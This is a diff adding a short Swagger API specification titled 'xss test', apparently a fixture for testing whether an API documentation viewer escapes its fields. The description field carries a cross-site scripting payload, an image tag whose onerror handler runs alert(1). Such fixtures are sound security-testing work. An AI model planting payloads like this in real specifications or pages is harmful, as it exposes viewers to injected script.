@@ -1,0 +1,18 @@
+{
+"apiVersion" : "1.0",
+"apis" : [ {
+"description" : "Sp3kt4r test",
+"path" : "a",
+"position" : 0
+}],
+"authorizations" : { },
+"info" : {
+"contact" : "pwn@asd.com",
+"description" : "<img src=\"xxx\" onerror=alert(1)>",
+"license" : "",
+"licenseUrl" : "",
+"termsOfServiceUrl" : "",
+"title" : "xss test"
+},
+"swaggerVersion" : "2.0"
+}
